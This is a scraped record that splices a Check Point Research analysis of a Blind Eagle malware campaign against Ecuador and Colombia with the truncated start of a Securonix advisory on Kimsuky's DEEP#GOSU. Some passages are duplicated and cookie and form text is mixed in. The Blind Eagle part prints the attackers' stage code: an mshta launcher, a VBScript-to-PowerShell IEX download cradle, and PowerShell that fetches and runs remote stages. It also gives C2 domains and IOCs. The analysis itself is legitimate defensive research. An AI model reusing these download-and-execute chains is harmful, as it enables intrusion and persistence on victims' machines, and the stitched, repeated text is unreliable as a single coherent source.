AV tools and behaves differently based on its findings. The main difference between each next stage consists in different pieces of code that will try to disable the security solution (for example Windows Defender), but in all cases, regardless of the type of security solution installed on the computer, the next stagewill download a version of python suitable for the target OS and install it: It will then download two scripts namedmp.pyandByAV2.pywhich will be stored in the user%Public%folder and for which it will create a scheduled task that will run every 10 minutes. For Windows 7 the task will be created by downloading an XML from the C2 “upxsystems[.]com”, while for Windows 8, 8.1, and 10 the malware will create the task using the cmdlet “New-ScheduledTask*”. In the case of Windows 7, the task is preconfigured to be executed as System and contains the following description <Description> Mantiene actualizado tu software de Google. Si esta tarea se desactiva o se detiene, tu software de Google no se mantendrá actualizado, lo que implica que las vulnerabilidades de seguridad que puedan aparecer no podrán arreglarse y es posible que algunas funciones no anden. Esta tarea se desinstala automáticamente si ningún software de Google la utiliza. </Description> It’s written using the kind of Spanish that is commonly spoken in the target countries, which can be noticed for example with the use of “es posible que algunas funcionesno anden” instead of “no se ejecuten” or any other variation more common in different geographic regions. The full description can be translated to: “Keeps your Google software up to date. If this task is disabled or stopped, your Google software will not be kept up to date, which means that security vulnerabilities that may appear cannot be fixed and some features may not work. This task is automatically uninstalled if no Google software uses it.” After downloading the Python scripts and adding persistence, the malware will try to kill all processes related to the infection. Regarding the two downloaded scripts, both are obfuscated using homebrew encoding that consists of base64 repeated 5 times (we will never, ever, tire of responding to such design choices with “known to be 5 times as secure as vanilla base64”): After deciphering these strings for each script we obtain two different types of Meterpreter samples. This code consists of an in-memory loader developed in Python, which will load and run a normal Meterpreter sample in DLL format that uses “tcp://systemwin.linkpc[.]net:443” as a C2 server. Python has a built-in PRNG, and in principle no one is stopping you from constructing a stream cipher based on it, which is what the malware authors do here. The embedded DLL is decrypted using this makeshift “randint stream cipher” with an embedded key (in this construction the key is used as the seed to prime therandomlibrary). In the grand tradition of cryptography used inside of malware purely to obfuscate buffers using a hardcoded key, the question of how secure this makeshift cipher is has exactly zero consequences. The second script basically consists of another sample of Meterpreter — this time a versiondeveloped entirely in Pythonand using the same C2 server. We can only speculate on why the server was configured to drop the same payload with the same C2 server but written in a different language; possibly one of the samples acts as a plan B in case of the other sample gets detected by some antivirus solution and removed. Blind Eagle is a strange bird among APT groups. Judging by its toolset and usual operations, it is clearly more interested in cybercrime and monetary gain than in espionage; however, unlike most such groups that just attack the entire world indiscriminately, Blind Eagle has a very narrow geographical focus, most of the time limited to a single country. This latest campaign targeting Ecuador highlights how, over the last few years, Blind Eagle has matured as a threat — refining their tools, adding features to leaked code bases, and experimenting with elaborate infection chains and “Living off the Land” as seen with the clever abuse ofmshta. If what we’ve seen is any indication, this group is worth keeping an eye on so that victims aren’t blindsided by whatever clever thing they try next. Check Point’s anti-phishingsolutionsfor office 365 & G suite analyzes all historical emails in order to determine prior trust relations between the sender and receiver, increasing the likelihood of identifying user impersonation or fraudulent messages. Artificial Intelligence (AI) and Indicators of Compromise (IoCs) used in the past train theHarmony Email & Officeplatform for what to look for in complex zero-day phishing attacks. Subscribe for cpr blogs, news and more Subscribe Now © 1994-2024 Check Point Software Technologies LTD. All rights reserved. Property ofCheckPoint.com Privacy Policy  First Name Last Name Country—Please choose an option—ChinaIndiaUnited StatesIndonesiaBrazilPakistanNigeriaBangladeshRussiaJapanMexicoPhilippinesVietnamEthiopiaEgyptGermanyIranTurkeyDemocratic Republic of the CongoThailandFranceUnited KingdomItalyBurmaSouth AfricaSouth KoreaColombiaSpainUkraineTanzaniaKenyaArgentinaAlgeriaPolandSudanUgandaCanadaIraqMoroccoPeruUzbekistanSaudi ArabiaMalaysiaVenezuelaNepalAfghanistanYemenNorth KoreaGhanaMozambiqueTaiwanAustraliaIvory CoastSyriaMadagascarAngolaCameroonSri LankaRomaniaBurkina FasoNigerKazakhstanNetherlandsChileMalawiEcuadorGuatemalaMaliCambodiaSenegalZambiaZimbabweChadSouth SudanBelgiumCubaTunisiaGuineaGreecePortugalRwandaCzech RepublicSomaliaHaitiBeninBurundiBoliviaHungarySwedenBelarusDominican RepublicAzerbaijanHondurasAustriaUnited Arab EmiratesIsraelSwitzerlandTajikistanBulgariaHong Kong (China)SerbiaPapua New GuineaParaguayLaosJordanEl SalvadorEritreaLibyaTogoSierra LeoneNicaraguaKyrgyzstanDenmarkFinlandSlovakiaSingaporeTurkmenistanNorwayLebanonCosta RicaCentral African RepublicIrelandGeorgiaNew ZealandRepublic of the CongoPalestineLiberiaCroatiaOmanBosnia and HerzegovinaPuerto RicoKuwaitMoldovMauritaniaPanamaUruguayArmeniaLithuaniaAlbaniaMongoliaJamaicaNamibiaLesothoQatarMacedoniaSloveniaBotswanaLatviaGambiaKosovoGuinea-BissauGabonEquatorial GuineaTrinidad and TobagoEstoniaMauritiusSwazilandBahrainTimor-LesteDjiboutiCyprusFijiReunion (France)GuyanaComorosBhutanMontenegroMacau (China)Solomon IslandsWestern SaharaLuxembourgSurinameCape VerdeMaltaGuadeloupe (France)Martinique (France)BruneiBahamasIcelandMaldivesBelizeBarbadosFrench Polynesia (France)VanuatuNew Caledonia (France)French Guiana (France)Mayotte (France)SamoaSao Tom and PrincipeSaint LuciaGuam (USA)Curacao (Netherlands)Saint Vincent and the GrenadinesKiribatiUnited States Virgin Islands (USA)GrenadaTongaAruba (Netherlands)Federated States of MicronesiaJersey (UK)SeychellesAntigua and BarbudaIsle of Man (UK)AndorraDominicaBermuda (UK)Guernsey (UK)Greenland (Denmark)Marshall IslandsAmerican Samoa (USA)Cayman Islands (UK)Saint Kitts and NevisNorthern Mariana Islands (USA)Faroe Islands (Denmark)Sint Maarten (Netherlands)Saint Martin (France)LiechtensteinMonacoSan MarinoTurks and Caicos Islands (UK)Gibraltar (UK)British Virgin Islands (UK)Aland Islands (Finland)Caribbean Netherlands (Netherlands)PalauCook Islands (NZ)Anguilla (UK)Wallis and Futuna (France)TuvaluNauruSaint Barthelemy (France)Saint Pierre and Miquelon (France)Montserrat (UK)Saint Helena, Ascension and Tristan da Cunha (UK)Svalbard and Jan Mayen (Norway)Falkland Islands (UK)Norfolk Island (Australia)Christmas Island (Australia)Niue (NZ)Tokelau (NZ)Vatican CityCocos (Keeling) Islands (Australia)Pitcairn Islands (UK) Email  BFSI uses cookies on this site. We use cookies to enable faster and easier experience for you. By continuing to visit this website you agree to our use of cookies.","    23 4 3 383 1 43 2 1 0 22 316 12 1 1 1 0 172 9 0 February 17, 2020 August 11, 2017 January 11, 2018    —Please choose an option—ChinaIndiaUnited StatesIndonesiaBrazilPakistanNigeriaBangladeshRussiaJapanMexicoPhilippinesVietnamEthiopiaEgyptGermanyIranTurkeyDemocratic Republic of the CongoThailandFranceUnited KingdomItalyBurmaSouth AfricaSouth KoreaColombiaSpainUkraineTanzaniaKenyaArgentinaAlgeriaPolandSudanUgandaCanadaIraqMoroccoPeruUzbekistanSaudi ArabiaMalaysiaVenezuelaNepalAfghanistanYemenNorth KoreaGhanaMozambiqueTaiwanAustraliaIvory CoastSyriaMadagascarAngolaCameroonSri LankaRomaniaBurkina FasoNigerKazakhstanNetherlandsChileMalawiEcuadorGuatemalaMaliCambodiaSenegalZambiaZimbabweChadSouth SudanBelgiumCubaTunisiaGuineaGreecePortugalRwandaCzech RepublicSomaliaHaitiBeninBurundiBoliviaHungarySwedenBelarusDominican RepublicAzerbaijanHondurasAustriaUnited Arab EmiratesIsraelSwitzerlandTajikistanBulgariaHong Kong (China)SerbiaPapua New GuineaParaguayLaosJordanEl SalvadorEritreaLibyaTogoSierra LeoneNicaraguaKyrgyzstanDenmarkFinlandSlovakiaSingaporeTurkmenistanNorwayLebanonCosta RicaCentral African RepublicIrelandGeorgiaNew ZealandRepublic of the CongoPalestineLiberiaCroatiaOmanBosnia and HerzegovinaPuerto RicoKuwaitMoldovMauritaniaPanamaUruguayArmeniaLithuaniaAlbaniaMongoliaJamaicaNamibiaLesothoQatarMacedoniaSloveniaBotswanaLatviaGambiaKosovoGuinea-BissauGabonEquatorial GuineaTrinidad and TobagoEstoniaMauritiusSwazilandBahrainTimor-LesteDjiboutiCyprusFijiReunion (France)GuyanaComorosBhutanMontenegroMacau (China)Solomon IslandsWestern SaharaLuxembourgSurinameCape VerdeMaltaGuadeloupe (France)Martinique (France)BruneiBahamasIcelandMaldivesBelizeBarbadosFrench Polynesia (France)VanuatuNew Caledonia (France)French Guiana (France)Mayotte (France)SamoaSao Tom and PrincipeSaint LuciaGuam (USA)Curacao (Netherlands)Saint Vincent and the GrenadinesKiribatiUnited States Virgin Islands (USA)GrenadaTongaAruba (Netherlands)Federated States of MicronesiaJersey (UK)SeychellesAntigua and BarbudaIsle of Man (UK)AndorraDominicaBermuda (UK)Guernsey (UK)Greenland (Denmark)Marshall IslandsAmerican Samoa (USA)Cayman Islands (UK)Saint Kitts and NevisNorthern Mariana Islands (USA)Faroe Islands (Denmark)Sint Maarten (Netherlands)Saint Martin (France)LiechtensteinMonacoSan MarinoTurks and Caicos Islands (UK)Gibraltar (UK)British Virgin Islands (UK)Aland Islands (Finland)Caribbean Netherlands (Netherlands)PalauCook Islands (NZ)Anguilla (UK)Wallis and Futuna (France)TuvaluNauruSaint Barthelemy (France)Saint Pierre and Miquelon (France)Montserrat (UK)Saint Helena, Ascension and Tristan da Cunha (UK)Svalbard and Jan Mayen (Norway)Falkland Islands (UK)Norfolk Island (Australia)Christmas Island (Australia)Niue (NZ)Tokelau (NZ)Vatican CityCocos (Keeling) Islands (Australia)Pitcairn Islands (UK) ","BlindEagle Targeting Ecuador With Sharpened Tools - Check Point ResearchCONTACT USDISCLOSURE POLICYCHECKPOINT.COMUNDER ATTACK?Latest PublicationsCPR Podcast ChannelWeb 3.0 SecurityIntelligence ReportsResourcesThreatCloud AIThreat Intelligence & ResearchZero Day ProtectionSandblast File AnalysisAbout UsSUBSCRIBESUBSCRIBECATEGORIESAndroid Malware23Artificial Intelligence4ChatGPT3Check Point Research Publications383Cloud Security1CPRadio43Crypto2Data & Threat Intelligence1Data Analysis0Demos22Global Cyber Attack Reports316How To Guides12Ransomware1Russo-Ukrainian War1Security Report1Threat and data analysis0Threat Research172Web 3.0 Security9Wipers0BlindEagle Targeting Ecuador With Sharpened ToolsJanuary 5, 2023https://research.checkpoint.com/2023/blindeagle-targeting-ecuador-with-sharpened-tools/Research by:Marc  Salinas Fernandez.HIGHLIGHTS:APT-C-36, also known as Blind Eagle, is a financially motivated threat group that has been launching indiscriminate attacks against citizens of various countries in South Americasince at least 2018.In a recent campaign targeting Ecuador based organizations, CPR detected a new infection chain that involves a more advanced toolset.The backdoor chosen for this campaign is typically used by espionage campaigns, which is unusual for this groupACTIVE CAMPAIGNS AGAINST COLOMBIAN TARGETSFor the last few months, we have been observing the ongoing campaigns orchestrated by Blind Eagle, which have mostly adhered to the TTPs described above — phishing emails pretending to be from the Colombian government. One typical example is an email purportedly from the Ministry of Foreign Affairs, threatening the recipient with issues when leaving the country unless they settle a bureaucratic matter.Such emails usually feature either a malicious document or a malicious link, but in this case, the attackers said “why not both?” and included both a link and a terse attached PDF directing the unfortunate victim to the exact same link.In both cases, the link in question consists of a legitimate link-shortening service URL that geolocates victims and makes them communicate with a different “server” depending on the original country (https://gtly[.]to/QvlFV_zgh). If the incoming HTTP request originates from outside Colombia, the server aborts the infection chain, acts innocent and redirects the client to the official website of the migration department of the Colombian Ministry of Foreign Affairs.If the incoming request seems to arrive from Colombia, the infection chain proceeds as scheduled. The server responds to the client with a file for download. This is a malware executable hosted on the file-sharing service MediaFire. The file is compressed, similar to a ZIP file, using theLHA algorithm. It is password-protected, making it impervious against naive static analysis and even naive sandbox emulation. The password is found both in the email and in the attached PDF.The malicious executable inside the LHA is written in .Net and packed. When unpacked, a modified sample of QuasarRAT is revealed.QuasarRAT is an open source trojan available in multiple sources like Github. The (probably Spanish-speaking) actors behind this APT group have added some extra capabilities over the last few years, which are easy to spot due to the names of functions and variables in Spanish. This process, by which threat actors abuse access to malware sources and each create their own special versions of that malware, is sadly not without precedent in the security landscape and alwaysmakes us heave a sad sigh when we encounter it.Although QuasarRAT is not a dedicated banking Trojan, it can be observed from the sample’s embedded strings that the group’s main goal in the campaign was to intercept victim access to their bank account.This is a complete list of targeted entities:Bancolombia Sucursal Virtual PersonasSucursal_Virtual_Empresas_Portal Empresarial DaviviendaBBVA Net CashColpatria – Banca Empresasbancaempresas.bancocajasocial.comEmpresarial Banco de Bogotaconexionenlinea.bancodebogota.comAV Villas – Banca EmpresarialBancoomeva Banca EmpresarialTRANSUNIONBanco PopularportalpymesBlockchainDashboardDaviviendaSome extra features added to Quasar by this group are a function named “ActivarRDP” (activate RDP) and two more to activate and deactivate the system Proxy:Along with a few more commands that incur technical debt by impudently disregarding Quasar’s convention for function name and parameter order:A BETTER CAMPAIGN FEATURING NEWER TOOLSOne specific sample caught our attention as it was related to a government institution from Ecuador and not from Colombia. While Blind Eagle attacking Ecuador is not unprecedented, it is still unusual. Similarly to the campaign described above, the geo-filter server in this campaign redirects requests outside of Ecuador and Colombia to the website of the Ecuadorian Internal Revenue Service:If contacted from Colombia or Ecuador, the downloaded file from Mediafire will be a RAR archive with a password. But instead of a single executable consisting of some packed RAT, the infection chain, in this case, is much more elaborate:Inside the RAR archive, there is an executable built with PyInstaller with a rather simplistic Python 3.10 code. This code just adds a new stage in the infection chain:import os
import subprocess
import ctypes
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
wsx = 'mshta <https://gtly> [.] to/dGBeBqd8z'
os.system(wsx)mshtais a utility that executes Microsoft HTML Applications, and the attackers abuse it here to download and execute the next stage, which contains VBS code embedded in an HTML.<script language=""VBScript""> 
CreateObject(""Wscript.Shell"").run""powershell.exe -noexit """"$a1='IEX ((new-object net.webclient).downl';$a2='oadstring(''https://[malicious domain]/wins''))';$a3=""""$a1,$a2"""";IEX(-join $a3)"""""", 0, true
self.close
</script>Usually campaigns by Blind Eagle abuse legitimate file sharing services such as Mediafire or free dynamic domains like “*.linkpc.net”; this case is different, and the next stage is hosted at the malicious domain upxsystems[.]com.This next-stage downloads and executes yet another next-stage, a script written in Powershell:function StartA{
[version]$OSVersion = [Environment]::OSVersion.Version
If ($OSVersion -gt ""10.0"") {
    iex (new-object net.webclient).downloadstring(""https://[malicious domain]/covidV22/ini/w10/0"")
} ElseIf ($OSVersion -gt ""6.3"") {
    iex (new-object net.webclient).downloadstring(""https://[malicious domain]/covidV22/ini/w8/0"")
} ElseIf ($OSVersion -gt ""6.2"") {
    iex (new-object net.webclient).downloadstring(""https://[malicious domain]/covidV22/ini/w8/0"")
} ElseIf ($OSVersion -gt ""6.1"") {
    iex (new-object net.webclient).downloadstring(""http://[malicious domain]/covidV22/ini/w7/0"")
}

}
StartAThe above Powershell checks the system version and downloads the appropriate additional Powershell. This additional OS-specific Powershell checks for installed AV tools and behaves differently based on its findings.The main difference between each next stage consists in different pieces of code that will try to disable the security solution (for example Windows Defender), but in all cases, regardless of the type of security solution installed on the computer, the next stagewill download a version of python suitable for the target OS and install it:Function PY(){
        if([System.IntPtr]::Size -eq 4)
        {
        $progressPreference = 'silentlyContinue'
        $url = ""<https://www.python.org/ftp/python/3.9.9/python-3.9.9-embed-win32.zip>""
        $output = ""$env:PUBLIC\\py.zip""
        $start_time = Get-Date
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($url, $output)
        New-Item ""$env:PUBLIC\\py"" -type directory
        $FILE=Get-Item ""$env:PUBLIC\\py"" -Force
        $FILE.attributes='Hidden'
        $shell = New-Object -ComObject Shell.Application
        $zip = $shell.Namespace(""$env:PUBLIC\\py.zip"")
        $items = $zip.items()
        $shell.Namespace(""$env:PUBLIC\\py"").CopyHere($items, 1556)
        start-sleep -Seconds 2;
        Remove-Item ""$env:PUBLIC\\py.zip""
        Remove-Item ""$env:USERPROFILE\\PUBLIC\\Local\\Microsoft\\WindowsApps\\*.*"" -Recurse -Force
        Remove-Item ""$env:USERPROFILE\\AppData\\Local\\Microsoft\\WindowsApps\\*.*"" -Recurse -Force
        setx PATH ""$env:path;$env:PUBLIC\\py""
        New-Item -Path HKCU:\\Software\\Classes\\Applications\\python.exe\\shell\\open\\command\\ -Value """"""$env:PUBLIC\\py\\python.exe"""" """"%1"""""" -Force
        Set-ItemProperty -path 'hkcu:\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\' -name ""$env:PUBLIC\\py\\python.exe.ApplicationCompany"" -value ""Python Software Foundation""
        Set-ItemProperty -path 'hkcu:\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\' -name ""$env:PUBLIC\\py\\python.exe.FriendlyAppName"" -value ""Python""

       }
....It will then download two scripts namedmp.pyandByAV2.pywhich will be stored in the user%Public%folder and for which it will create a scheduled task that will run every 10 minutes. For Windows 7 the task will be created by downloading an XML from the C2 “upxsystems[.]com”, while for Windows 8, 8.1, and 10 the malware will create the task using the cmdlet “New-ScheduledTask*”.In the case of Windows 7, the task is preconfigured to be executed as System and contains the following description<Description> Mantiene actualizado tu software de Google. Si esta tarea se desactiva o se detiene, tu software de Google no se mantendrá actualizado, lo que implica que las vulnerabilidades de seguridad que puedan aparecer no podrán arreglarse y es posible que algunas funciones no anden. Esta tarea se desinstala automáticamente si ningún software de Google la utiliza. </Description>It’s written using the kind of Spanish that is commonly spoken in the target countries, which can be noticed for example with the use of “es posible que algunas funcionesno anden” instead of “no se ejecuten” or any other variation more common in different geographic regions.The full description can be translated to:“Keeps your Google software up to date. If this task is disabled or stopped, your Google software will not be kept up to date, which means that security vulnerabilities that may appear cannot be fixed and some features may not work. This task is automatically uninstalled if no Google software uses it.”After downloading the Python scripts and adding persistence, the malware will try to kill all processes related to the infection.Regarding the two downloaded scripts, both are obfuscated using homebrew encoding that consists of base64 repeated 5 times (we will never, ever, tire of responding to such design choices with “known to be 5 times as secure as vanilla base64”):After deciphering these strings for each script we obtain two different types of Meterpreter samples.ByAV2.pyThis code consists of an in-memory loader developed in Python, which will load and run a normal Meterpreter sample in DLL format that uses “tcp://systemwin.linkpc[.]net:443” as a C2 server.Python has a built-in PRNG, and in principle no one is stopping you from constructing a stream cipher based on it, which is what the malware authors do here. The embedded DLL is decrypted using this makeshift “randint stream cipher” with an embedded key (in this construction the key is used as the seed to prime therandomlibrary). In the grand tradition of cryptography used inside of malware purely to obfuscate buffers using a hardcoded key, the question of how secure this makeshift cipher is has exactly zero consequences.mp.pyThe second script basically consists of another sample of Meterpreter — this time a versiondeveloped entirely in Pythonand using the same C2 server. We can only speculate on why the server was configured to drop the same payload with the same C2 server but written in a different language; possibly one of the samples acts as a plan B in case of the other sample gets detected by some antivirus solution and removed.CONCLUSIONBlind Eagle is a strange bird among APT groups. Judging by its toolset and usual operations, it is clearly more interested in cybercrime and monetary gain than in espionage; however, unlike most such groups that just attack the entire world indiscriminately, Blind Eagle has a very narrow geographical focus, most of the time limited to a single country. This latest campaign targeting Ecuador highlights how, over the last few years, Blind Eagle has matured as a threat — refining their tools, adding features to leaked code bases, and experimenting with elaborate infection chains and “Living off the Land” as seen with the clever abuse ofmshta. If what we’ve seen is any indication, this group is worth keeping an eye on so that victims aren’t blindsided by whatever clever thing they try next.Check Point’s anti-phishingsolutionsfor office 365 & G suite analyzes all historical emails in order to determine prior trust relations between the sender and receiver, increasing the likelihood of identifying user impersonation or fraudulent messages. Artificial Intelligence (AI) and Indicators of Compromise (IoCs) used in the past train theHarmony Email & Officeplatform for what to look for in complex zero-day phishing attacks.IOCs8e864940a97206705b29e645a2c2402c2192858357205213567838443572f564EML Colombia2702ea04dcbbbc3341eeffb494b692e15a50fbd264b1d676b56242aae3dd9001PDF Colombiaf80eb2fcefb648f5449c618e83c4261f977b18b979aacac2b318a47e99c19f64PDF Colombia68af317ffde8639edf2562481912161cf398f0edba6e06745d90c1359554c76eLHA (zip file)61685ea4dc4ca4d01e0513d5e23ee04fc9758d6b189325b34d5b16da254cc9f4EXEhttps://www.mediafire[.]com/file/cfnw8rwufptk5jz/migracioncolombiaprocesopendienteid2036521045875referenciawwwmigraciongovco.LHA/fileLHA download linkhttps://gtly[.]to/QvlFV_zghDropper domainhttps://gtly[.]to/cuOv3gNDiDropper domainhttps://gtly[.]to/dGBeBqd8zDropper domain (Py2EXE)laminascol[.]linkpc[.]netQuasarRAT C2systemwin[.]linkpc[.]netMeterpreter C2upxsystems[.]comEcuador mid-infection C2c63d15fe69a76186e4049960337d8c04c6230e4c2d3d3164d3531674f5f74cdfwins (inicio0)353406209dea860decac0363d590096e2a8717dd37d6b4d8b0272b02ad82472ewins (PowerShell)a03259900d4b095d7494944c50d24115c99c54f3c930bea08a43a8f0a1da5a2e0 (Windows 10 Powershell)46addee80c4c882b8a6903cced9b6c0130ec327ae8a59c5946bb954ccea64a120 (Windows 8 Powershell)c067869ac346d007a17e2e91c1e04ca0f980e8e9c4fd5c7baa0cb0cc2398fe590 (Windows 7 Powershell)10fd1b81c5774c1cc6c00cc06b3ed181b2d78191c58b8e9b54fa302e4990b13dByAV2.pyc4ff3fb6a02ca0e51464b1ba161c0a7387b405c78ead528a645d08ad3e696b12mp.pyac1ea54f35fe9107af1aef370e4de4dc504c8523ddaae10d95beae5a3bf67716InMemoryMeterpreterGO UPBACK TO ALL POSTSPOPULAR POSTSArtificial IntelligenceChatGPTCheck Point Research PublicationsOPWNAI : Cybercriminals Starting to Use ChatGPTCheck Point Research PublicationsThreat ResearchHacking Fortnite AccountsArtificial IntelligenceChatGPTCheck Point Research PublicationsOpwnAI: AI That Can Save the Day or HACK it AwayBLOGS AND PUBLICATIONSCheck Point Research PublicationsGlobal Cyber Attack ReportsThreat ResearchFebruary 17, 2020“The Turkish Rat” Evolved Adwind in a Massive Ongoing Phishing CampaignCheck Point Research PublicationsAugust 11, 2017“The Next WannaCry” Vulnerability is HereCheck Point Research PublicationsJanuary 11, 2018‘RubyMiner’ Cryptominer Affects 30% of WW NetworksPublicationsGlobal cyber attack reportsResearch publicationsIPS advisoriesCheck point blogDemosToolsSandblast file analysisThreatCloudThreat IntelligenceZero day protectionLive threat mapAbout UsContact UsLet’s get in touchSubscribe for cpr blogs, news and moreSubscribe Now© 1994-2024 Check Point Software Technologies LTD. All rights reserved.Property ofCheckPoint.comPrivacy PolicySUBSCRIBE TO CYBER INTELLIGENCE REPORTSFirst NameLast NameCountry—Please choose an option—ChinaIndiaUnited StatesIndonesiaBrazilPakistanNigeriaBangladeshRussiaJapanMexicoPhilippinesVietnamEthiopiaEgyptGermanyIranTurkeyDemocratic Republic of the CongoThailandFranceUnited KingdomItalyBurmaSouth AfricaSouth KoreaColombiaSpainUkraineTanzaniaKenyaArgentinaAlgeriaPolandSudanUgandaCanadaIraqMoroccoPeruUzbekistanSaudi ArabiaMalaysiaVenezuelaNepalAfghanistanYemenNorth KoreaGhanaMozambiqueTaiwanAustraliaIvory CoastSyriaMadagascarAngolaCameroonSri LankaRomaniaBurkina FasoNigerKazakhstanNetherlandsChileMalawiEcuadorGuatemalaMaliCambodiaSenegalZambiaZimbabweChadSouth SudanBelgiumCubaTunisiaGuineaGreecePortugalRwandaCzech RepublicSomaliaHaitiBeninBurundiBoliviaHungarySwedenBelarusDominican RepublicAzerbaijanHondurasAustriaUnited Arab EmiratesIsraelSwitzerlandTajikistanBulgariaHong Kong (China)SerbiaPapua New GuineaParaguayLaosJordanEl SalvadorEritreaLibyaTogoSierra LeoneNicaraguaKyrgyzstanDenmarkFinlandSlovakiaSingaporeTurkmenistanNorwayLebanonCosta RicaCentral African RepublicIrelandGeorgiaNew ZealandRepublic of the CongoPalestineLiberiaCroatiaOmanBosnia and HerzegovinaPuerto RicoKuwaitMoldovMauritaniaPanamaUruguayArmeniaLithuaniaAlbaniaMongoliaJamaicaNamibiaLesothoQatarMacedoniaSloveniaBotswanaLatviaGambiaKosovoGuinea-BissauGabonEquatorial GuineaTrinidad and TobagoEstoniaMauritiusSwazilandBahrainTimor-LesteDjiboutiCyprusFijiReunion (France)GuyanaComorosBhutanMontenegroMacau (China)Solomon IslandsWestern SaharaLuxembourgSurinameCape VerdeMaltaGuadeloupe (France)Martinique (France)BruneiBahamasIcelandMaldivesBelizeBarbadosFrench Polynesia (France)VanuatuNew Caledonia (France)French Guiana (France)Mayotte (France)SamoaSao Tom and PrincipeSaint LuciaGuam (USA)Curacao (Netherlands)Saint Vincent and the GrenadinesKiribatiUnited States Virgin Islands (USA)GrenadaTongaAruba (Netherlands)Federated States of MicronesiaJersey (UK)SeychellesAntigua and BarbudaIsle of Man (UK)AndorraDominicaBermuda (UK)Guernsey (UK)Greenland (Denmark)Marshall IslandsAmerican Samoa (USA)Cayman Islands (UK)Saint Kitts and NevisNorthern Mariana Islands (USA)Faroe Islands (Denmark)Sint Maarten (Netherlands)Saint Martin (France)LiechtensteinMonacoSan MarinoTurks and Caicos Islands (UK)Gibraltar (UK)British Virgin Islands (UK)Aland Islands (Finland)Caribbean Netherlands (Netherlands)PalauCook Islands (NZ)Anguilla (UK)Wallis and Futuna (France)TuvaluNauruSaint Barthelemy (France)Saint Pierre and Miquelon (France)Montserrat (UK)Saint Helena, Ascension and Tristan da Cunha (UK)Svalbard and Jan Mayen (Norway)Falkland Islands (UK)Norfolk Island (Australia)Christmas Island (Australia)Niue (NZ)Tokelau (NZ)Vatican CityCocos (Keeling) Islands (Australia)Pitcairn Islands (UK)EmailWe value your privacy!BFSI uses cookies on this site. We use cookies to enable faster and easier experience for you. By continuing to visit this website you agree to our use of cookies.ACCEPTREJECT"
https://www.securonix.com/blog/securonix-threat-research-security-advisory-new-deepgosu-attack-campaign/,"By Securonix Threat Research: D. Iuzvyk, T. Peck, O. Kolesnikov The Securonix Threat Research team has uncovered an elaborate multi-stage attack campaign likely associated with the North KoreanKimsukygroup.  The Securonix Threat Research (STR) team has been monitoring a new campaign tracked as DEEP#GOSU likely associated with the Kimsuky group, which features some new code/stagers as well as some recycled code and TTPs that werereported in the past. While the targeting of South Korean victims by the Kimsuky grouphappened before, from the tradecraft observed it’s apparent that the group has shifted to using a new script-based attack chain that leverages multiple PowerShell and VBScript stagers to quietly infect systems. The later-stage scripts allow the attackers to monitor clipboard, keystroke, and other session activity. The threat actors also employed a remote access trojan (RAT) software to allow for full control over the infected hosts, while the background scripts continued to provide persistence and monitoring capabilities. All of the C2 communication is handled through legitimate services such as Dropbox or Google Docs allowing the malware to blend undetected into regular network traffic. Since these payloads were pulled from remote sources like Dropbox, it allowed the malware maintainers to dynamically update its functionalities or deploy additional modules without direct interaction with the system . The malware used in the DEEP#GOSU campaign likely enters the system through typical means where the user downloads a malicious email attachment containing a zip file with a single disguised file using the extension: pdf.lnk, (IMG_20240214_0001.pdf.lnk) in this case. The use of shortcut files, or .lnk files by threat actors is nothing new. However, in the case of DEEP#GOSU, the methodology behind the code execution is quite different from what we have typically seen in the past. First, as seen in the figure below, the length of the command is quite impressive and it’s clear that the executed PowerShell is designed to perform several complex functions. Additionally, standing at about 2.2MB, it’s clear that there is more to this shortcut file than what meets the eye.  Figure 1: IMG_20240214_0001.pdf.lnk – command line execution The embedded PowerShell script contained within the shortcut file is designed to take byte data from itself, which extracts embedded files, AESDecrypt and executes further malicious code downloaded from the internet (/step2/ps.bin) and clean up traces of its execution. The use of encryption and cloud services for payload retrieval indicates some level of sophistication intended to evade detection and analysis. This type of infrastructure typically takes much more time to set up and maintain versus simply hosting files on rented servers. Let’s first analyze the reason that the shortcut file is over 2MB in size. Upon close analysis, the shortcut file appears to have an entire embedded PDF concatenated to it after tens of thousands of “A” characters. Those characters may be an attempt to pad the size of the file to evade AV detections. The figure below demonstrates how this looks when using a hexadecimal editor to view the file’s raw data. On the left, we can see the end of the shortcut code which calls cmd.exe (to eventually call powershell.exe) and the start of the sequence of “A” characters. Over on the left the A’s terminate and the start of a PDF header appears!  Figure 2: Hex bytes of IMG_20240214_0001.pdf.lnk highlighting the embedded PDF file So, the shortcut file has a concatenated PDF file attached to it. The PowerShell code contains a clever function that performs a few tasks. The PowerShell code below is taken from the code from within the shortcut file (figure 1) and then cleaned up a bit so it’s easier to read:  Figure 3: IMG_20240214_0001.pdf.lnk – extract PDF portion from itself What makes this tactic clever is that there is technically no PDF file contained within the initial zip file sent to the victim. When the user clicks the PDF lure (shortcut file) they’re immediately presented with a PDF file thus removing any concern that anything unexpected happened. The PDF lure document is in Korean and appears to be an announcement regarding the son of Korean Airlines CEO Choi Hyun (the late Choi Yul) and states that the son has passed away due to a car accident. The rest contains details and dates of the funeral hall.  Figure 4: IMG_20240214_0001.pdf lure document In addition to extracting and executing the PDF document, the shortcut file also executes the malware’s next stage payload from a Dropbox URL (hxxps://content.dropboxapi[.]com/2/files/download/step2/ps.bin). Despite its name, the ps.bin file is actually another PowerShell script which we’ll dive into later. Since Dropbox requires authentication, all of the required parameters are embedded into the shortcut’s original PowerShell script (figure 1). With the PowerShell code cleaned up, the portion of the script responsible for downloading and executing the next-stage payload ($newString) is highlighted below.  Figure 5: IMG_20240214_0001.lnk – download and invoke next-stage payload from Dropbox To sum up, the PowerShell script contained with the shortcut file is designed to silently find and execute the specifically crafted malicious .lnk file (itself), extract and execute the embedded PDF lure document, authenticate, decrypt and execute further malicious code downloaded from Dropbox, and then clean up traces of its execution. The use of encryption and cloud services for payload retrieval indicates a level of sophistication intended to evade detection and analysis. At this stage, the initial shortcut file has downloaded and invoked a remote payload from Dropbox called ps3.bin. The PowerShell code contained within the .bin file defines a function (Load) that performs several operations which includes downloading, decompressing, and dynamically loading and executing .NET assembly code from a different Dropbox URL.  Figure 6: Example of PowerShell ps.bin In addition to the above the script also invokes a method on an object instance using reflection in PowerShell, with a parameter that appears to be a Base64-encoded string. The string can be seen in the figure below.  Figure 7: ps.bin PowerShell invokes next stage payloads The $method variable is set up and holds a reference to a 